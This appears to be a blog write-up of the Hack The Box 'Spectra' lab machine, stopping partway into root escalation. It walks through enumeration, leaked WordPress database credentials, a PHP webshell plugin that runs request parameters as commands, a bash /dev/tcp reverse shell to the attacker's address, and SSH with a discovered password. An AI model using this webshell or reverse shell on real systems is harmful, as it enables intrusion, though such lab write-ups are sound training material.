---
title: HTB Spectra - Writeup
date: "2021-07-18"
draft: false
tags: ["hackthebox", "machines", "writeup"]
---

# Enumeration

## Nmap Scans

### Service Scan

```
# Nmap 7.91 scan initiated Fri Jun 11 23:59:16 2021 as: nmap -T4 -A -p22,80,3306 -oA nmap/service-scan -Pn 10.10.10.229
Nmap scan report for 10.10.10.229
Host is up (0.068s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Sat Jun 12 00:01:05 2021 -- 1 IP address (1 host up) scanned in 109.31 seconds

```

**Summary**

- Ports opened -> 22, 80, 3306

## Enumeration: Port 80

Landing page:

![/img/spectra/Pasted_image_20210612000503.png](/img/spectra/Pasted_image_20210612000503.png)

Source code:

![/img/spectra/Pasted_image_20210612000522.png](/img/spectra/Pasted_image_20210612000522.png)

This uses `http://spectra.htb/` instead of the IP, so we modify in our `/etc/hosts` file as well

```
$ cat /etc/hosts | grep spectra.htb
10.10.10.229    spectra.htb
```

### /main

Landing page

![/img/spectra/Pasted_image_20210612000654.png](/img/spectra/Pasted_image_20210612000654.png)

It's a wordpress site.

- wpscan does not reveal anything interesting.

### /testing

- Error establishing database connection

Running ffuf

```
$ ffuf -u <http://spectra.htb/testing/FUZZ> -w /usr/share/wordlists/dirb/common.txt -r -v -c -ic -e .php,.txt -of html -o http/http-80-common-testing.html

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : <http://spectra.htb/testing/FUZZ>
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .txt
 :: Output file      : http/http-80-common-testing.html
 :: File format      : html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

[Status: 200, Size: 2514, Words: 1130, Lines: 27]
| URL | <http://spectra.htb/testing/>
    * FUZZ:

[Status: 200, Size: 19915, Words: 3331, Lines: 385]
| URL | <http://spectra.htb/testing/license.txt>
    * FUZZ: license.txt

[Status: 200, Size: 11460, Words: 5252, Lines: 102]
| URL | <http://spectra.htb/testing/wp-admin>
    * FUZZ: wp-admin

[Status: 200, Size: 627, Words: 259, Lines: 11]
| URL | <http://spectra.htb/testing/wp-content>
    * FUZZ: wp-content

[Status: 200, Size: 585, Words: 50, Lines: 7]
| URL | <http://spectra.htb/testing/wp-settings.php>
    * FUZZ: wp-settings.php

[Status: 200, Size: 25891, Words: 10424, Lines: 215]
| URL | <http://spectra.htb/testing/wp-includes>
    * FUZZ: wp-includes

[Status: 200, Size: 0, Words: 1, Lines: 1]
| URL | <http://spectra.htb/testing/xmlrpc.php>
    * FUZZ: xmlrpc.php

[Status: 200, Size: 0, Words: 1, Lines: 1]
| URL | <http://spectra.htb/testing/xmlrpc.php>
    * FUZZ: xmlrpc.php

:: Progress: [13842/13842] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:45] :: Errors: 0 ::

```

- Going to `/testing/wp-admin` displays all the files in that directory. Perhaps, directory listing is turned on.
    
    ![/img/spectra/Pasted_image_20210617193018.png](/img/spectra/Pasted_image_20210617193018.png)
    
- Instead of going to `/testing/index.php` -> `/testing/` gives us all the files there.
    
    ![/img/spectra/Pasted_image_20210617193216.png](/img/spectra/Pasted_image_20210617193216.png)
    

==Should try *.php.save* during directory brute forcing as well==

Seeing the source code of `wp-config.php.save` gives DB credentials

![/img/spectra/Pasted_image_20210617193453.png](/img/spectra/Pasted_image_20210617193453.png)

```
define( 'DB_NAME', 'dev' );
/** MySQL database username */
define( 'DB_USER', 'devtest' );
/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

```

Using this credentials to login as `administrator` on `http://spectra.htb/main/wp-admin/login.php` and we are in.

![/img/spectra/Pasted_image_20210617193948.png](/img/spectra/Pasted_image_20210617193948.png)

Going to theme editor and updating 404.php

![/img/spectra/Pasted_image_20210617194207.png](/img/spectra/Pasted_image_20210617194207.png)

Error:

![/img/spectra/Pasted_image_20210617194410.png](/img/spectra/Pasted_image_20210617194410.png)

### Getting shell by uploading plugin

```
┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ cat rev.php
<?php

/**
 * Plugin Name: Wordpress Reverse Shell
 * Author: fake_batman_
 */
    system($_REQUEST['cmd']);

?>
┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ zip rev.zip rev.php
updating: rev.php (deflated 3%
```

![/img/spectra/Pasted_image_20210617203800.png](/img/spectra/Pasted_image_20210617203800.png)

Upload the plugin.

Go to `view-source:<http://spectra.htb/main/wp-content/plugins/rev/rev.php?cmd=id>`

And we get RCE

![/img/spectra/Pasted_image_20210617204606.png](/img/spectra/Pasted_image_20210617204606.png)

```
bash -i >& /dev/tcp/10.10.14.28/4444 0>&1

```

# Escalating to user

![/img/spectra/Pasted_image_20210617213606.png](/img/spectra/Pasted_image_20210617213606.png)

![/img/spectra/Pasted_image_20210617213634.png](/img/spectra/Pasted_image_20210617213634.png)

![/img/spectra/Pasted_image_20210617213655.png](/img/spectra/Pasted_image_20210617213655.png)

The password `SummerHereWeCome!!` works for katie. Hehe!

```
┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ ssh katie@spectra.htb
Password:
katie@spectra ~ $ ls
log  user.txt
katie@spectra ~ $ cat user.txt
e89d27fe195e911*****************
```

## Escalating to the root

We are use `katie` and need to get root.

### `sudo -l` output

```
katie@spectra /dev/shm $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl

```

Getting to root -> [https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9](https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9)

### linpeas.sh interesting screenshots

![/img/spectra/Pasted_image_20210618001207.png](/img/spectra/Pasted_image_20210618001207.png)

katie is in group `developers`

![/img/spectra/Pasted_image_20210618001309.png](/img/spectra/Pasted_image_20210618001309.png)